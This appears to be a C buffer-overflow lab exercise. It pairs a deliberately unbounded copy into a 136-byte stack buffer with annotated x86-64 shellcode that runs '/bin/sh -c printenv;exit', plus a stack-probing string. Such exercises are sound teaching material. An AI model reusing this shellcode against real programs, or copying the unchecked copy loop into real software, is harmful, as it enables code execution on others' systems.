#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

void doTest();

int main(int argc, char * argv[]){

    putenv("MD5=8b7588b30498654be2626aac62ef37a3");

    /* call the vulnerable function */
    doTest();

    exit(0);
}

// Variable to contain hex bytes of shell code
char compromise[209] = {
                                             //  bits 64
     0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,//; two nop matching size in selfcomp.c
     0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
     0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
     0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
     0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
     0x90,0x90,0x90,0x90,
     0x90,0x90,0x90,0x90,0x90,0x90,          // ; overwriting the first 6 bytes of ret addy
     0x90,                                   // ; final byte
     0xEB,0x62,                              //  start:     jmp short codeEnd
     0x5E,                                   //  start2:    pop rsi
                                             //   ; clear the a register
     0xB8,                                   //             mov rax,0x0
                                             //   ; restore null bytes to data
     0x88,0x46,0x07,                         //             mov [byte rsi+flagStr-exeStr-2],al
     0x88,0x46,0x0B,                         //             mov [byte rsi+cmdStr-exeStr-1],al
     0x88,0x46,0x19,                         //             mov [byte rsi+arrayAddr-exeStr-1],al
     0x48,0x89,0x46,0x32,                    //             mov [byte rsi+arrayAddr-exeStr+24],rax
                                             //    ; restore argv
     0x48,0x89,0x76,0x1A,                    //             mov [byte rsi + arrayAddr - exeStr],rsi
     0x48,0x8D,0x7E,0x09,                    //             lea rdi,[byte rsi + flagStr - exeStr] 
     0x48,0x89,0x7E,0x1E,                    //             mov [byte rsi + arrayAddr - exeStr + 4],rdi
     0x48,0x8D,0x7E,0x0C,                    //             lea rdi, [byte rsi + cmdStr - exeStr]
     0x48,0x89,0x7E,0x22,                    //             mov [byte rsi + arrayAddr - exeStr + 8],rdi
                                             //     ; execve system call
     0xB0,0x3B,                              //             mov al,0x3b
     0x48,0xBF,                              //             mov rdi,exeStr
     0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x6B,
     0x48,0xBE,                              //             mov rsi,arrayAddr
     0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x85,
     0x48,0x89,0xE2,                         //             mov rdx,rsp
     0x48,0xC1,0xEA,0x20,                    //             shr rdx,32
     0x48,0xC1,0xE2,0x20,                    //             shl rdx,32
     0x48,0x8B,0x0C,0x25,0xC0,0x56,0xFB,0xF7,//             mov rcx,[0x7ffff7fb56c0]
     0x48,0x09,0xCA,                         //             or  rdx,rcx
     0x48,0x8D,0x3A,                         //             lea rdi,[rdx]
     0x0F,0x05,                              //             syscall  
                                             //     ; exit system call
     0x48,0x89,0xC7,                         //             mov rdi,rax
     0x48,0x31,0xC0,                         //             xor rax,rax
     0xB0,0x3C,                              //             mov al,0x3c
     0x0F,0x05,                              //             syscall
                           
     0xE8,0x99,0xFF,0xFF,0xFF,               //  codeEnd:   call start2
                                             //    ; data
     0x2F,0x62,0x69,0x6E,0x2F,0x73,0x68,     //  exeStr:    db "/bin/shXy"
     0x58,0x79,
     0x2D,0x63,0x58,                         //  flagStr:   db "-cX"
     0x70,0x72,0x69,0x6E,0x74,0x65,0x6E,0x76,0x3B,   //  cmdStr:    db "printenv;exitX"
     0x65,0x78,0x69,0x74,0x58,         
     0xFF,0xFF,0xFF,0xFF,                    //  arrayAddr: dd 0xffffffffffffffff
     0xFF,0xFF,0xFF,0xFF,                    //             dd 0xffffffffffffffff
     0xFF,0xFF,0xFF,0xFF,                    //             dd 0xffffffffffffffff
     0xFF,0xFF,0xFF,0xFF,                    //             dd 0xffffffffffffffff
     0x93,0x00,0x00,0x00,                    //  newAddr: dd newAddr-start
     // ret addy
     0xff,0xff,0xff,0xff,0xff,0x7f,0x00,

};

// string variable to probe the stack and find the correct
// values for the shell code.
char * compromise1 =
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxx"
    "\x4d\x4e\x4f\x50\x57\x58\x59\x5a" //0x4d4e4f505758595a
    "xxxxxxxx"; //0x7fffffffdb98 - 81 == 0x7fffffffdb47
    // environ == 0x7ffff7fb5600

int i;
void doTest(){
    char buffer[136];
    /* copy the contents of the compromise
       string onto the stack
       - change compromise1 to compromise
         when shell code is written */
    for (i = 0; compromise1[i]; i++){
	buffer[i] = compromise1[i];
    }
}

